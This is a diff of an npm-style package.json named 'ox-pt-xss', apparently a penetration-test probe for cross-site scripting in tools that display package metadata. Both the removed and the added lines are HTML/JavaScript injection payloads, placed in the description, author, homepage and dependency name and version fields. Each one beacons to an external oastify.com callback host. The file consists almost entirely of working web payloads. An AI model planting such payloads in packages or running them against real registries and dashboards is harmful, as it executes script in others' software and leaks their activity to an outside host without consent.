@@ -1,13 +1,9 @@
 {
   "name": "ox-pt-xss",
   "version": "1.0.0",
-  "description": "<img src='https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/description'>",
-  "keywords": ["<img src='https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/keyword'>"],
-  "author": "<img src=x onerror='new Image().src=`https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/author-js`'>",
-  "license": "<img src='https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/license'>",
-  "homepage": "https://ox.test/\"><img src=https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/homepage>",
   "dependencies": {
-    "<img src='https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/depname-img'>": "1.0.0",
-    "<svg onload='new Image().src=`https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/depname-svg`'>": "1.0.0"
+    "<img src='https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/name-html'>": "<img src='https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/version-html'>",
+    "<img src=x onerror='new Image().src=`https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/name-js`'>": "<img src=x onerror='new Image().src=`https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/version-js`'>",
+    "<svg onload='new Image().src=`https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/name-svg`'>": "<svg onload='new Image().src=`https://vfed5y00k1dr5wguo6i1b30qbhh950tp.oastify.com/xss/version-svg`'>"
   }
 }
